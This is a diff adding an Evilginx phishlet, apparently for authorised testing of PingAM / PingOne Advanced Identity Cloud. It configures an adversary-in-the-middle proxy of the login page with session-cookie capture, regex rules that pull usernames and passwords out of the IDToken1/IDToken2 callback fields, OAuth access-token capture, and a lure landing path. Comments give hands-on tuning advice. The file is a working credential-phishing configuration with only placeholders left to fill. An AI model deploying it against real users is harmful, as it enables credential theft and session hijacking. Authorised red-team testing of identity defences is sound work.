@@ -1,0 +1,75 @@
+# Evilginx AITM test phishlet for PingAM / PingOne Advanced Identity Cloud (ex-ForgeRock).
+# Adapted from Ping Identity's own evilginx-for-testing-p1-aitm phishlet (public:
+# https://github.com/pingidentity/evilginx-for-testing-p1-aitm), which targets a PingOne (P1)
+# tenant's hosted login. This version targets PingAM's REST-driven XUI login instead, which has
+# a materially different request shape - see the README "How this differs from Ping's P1 version"
+# section before assuming anything here transfers unchanged to your tenant.
+#
+# Every <PLACEHOLDER> below must be filled in for YOUR tenant. See README "Configuration
+# reference" for exactly what each one means and how to find the right value.
+author: '@you'
+min_ver: '3.0.0'
+
+# The exact URL of the tree you want to test, including its query string. For a named tree
+# (authIndexType=service) this is NOT just the login page - confirm this is the URL that actually
+# invokes your Protect/risk-evaluation node (see README "Preflight").
+redirect_url: 'https://<target_sub>.<target_domain>/am/XUI/?realm=<realm>&authIndexType=service&authIndexValue=<tree_name>'
+
+proxy_hosts:
+# phish_sub: the subdomain prefix Evilginx serves this phishlet on, under YOUR phishing domain
+# (general.domain in config.json). Leave as '' to serve on the bare phishing domain with no
+# subdomain at all (e.g. phishing_domain itself, no prefix) - see README for when you'd want each.
+- {phish_sub: '<phish_sub>', orig_sub: '<target_sub>', domain: '<target_domain>', session: true, is_landing: true, auto_filter: true}
+
+sub_filters:
+
+auth_tokens:
+# OPTIONAL and usually irrelevant: only fires if your tree/SP drives an OAuth2 code exchange
+# during login (AM's /am/oauth2/access_token being called). A bare AM tree login with no SP
+# requesting tokens never hits this - the session cookie (proxy_hosts' session:true above) is
+# what actually matters for a bare AM login. Delete this whole block if you confirm (via
+# DevTools) that nothing in your flow calls /am/oauth2/*.
+- domain: '<target_sub>.<target_domain>'
+  path: '/am/oauth2/access_token'
+  name: 'token'
+  search: '"access_token":"([^"]*)'
+  type: 'body'
+
+credentials:
+  username:
+    key: 'username'
+    # VERIFY-BEFORE-TRUST: AM's REST auth API drives a dynamic "callbacks" array
+    # (NameCallback/PasswordCallback with IDTokenN input fields) whose numbering depends on YOUR
+    # tree. This assumes the default ordering (username=IDToken1, password=IDToken2) - a tree with
+    # extra steps (MFA, device profiling, a hidden callback) before the password step will shift
+    # these numbers. Confirm against a real request in DevTools before trusting any capture here
+    # (README "Preflight"). Confirmed correct as IDToken1/IDToken2 on one real PingAM "Demo
+    # Protect"-style tree during development of this repo - not guaranteed for yours.
+    search: '"name":"IDToken1","value":"([^"]*)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"name":"IDToken2","value":"([^"]*)"'
+    type: 'json'
+
+login:
+  # Must be the full hostname = orig_sub + domain from proxy_hosts above (Evilginx 3.3.0 rejects a
+  # bare registrable domain here - confirmed by a real load error during development).
+  domain: '<target_sub>.<target_domain>'
+  # Evilginx's "login succeeded" path match. AM's XUI is a single-page app that largely stays on
+  # the same URL and just sets a session cookie - there's often no distinct post-login path.
+  # Evilginx still captures the session cookie via proxy_hosts' session:true regardless of
+  # whether this ever matches, so leaving it pointed at the XUI root is a safe default; walk a
+  # real login first and set this to wherever you actually land if you find something better.
+  #
+  # IMPORTANT - also doubles as the lure's landing URL (README "The lure drops its own query
+  # string"): GetLoginUrl() builds the lure->login redirect as plain string concatenation
+  # ("https://" + login.domain + login.path), with NO query-string field anywhere in the schema.
+  # If your tree needs a query string to reach the right flow (a *named* tree via
+  # authIndexType=service, as here), it has to be baked directly into this path string, exactly
+  # as below - delete everything from the '?' onward if your tenant needs no query string.
+  path: '/am/XUI/?realm=<realm>&authIndexType=service&authIndexValue=<tree_name>'
+
+# js_inject is only needed for app-specific URL-rewriting quirks. Leave empty until you've watched
+# a real login and seen something concrete that needs rewriting.
+js_inject:
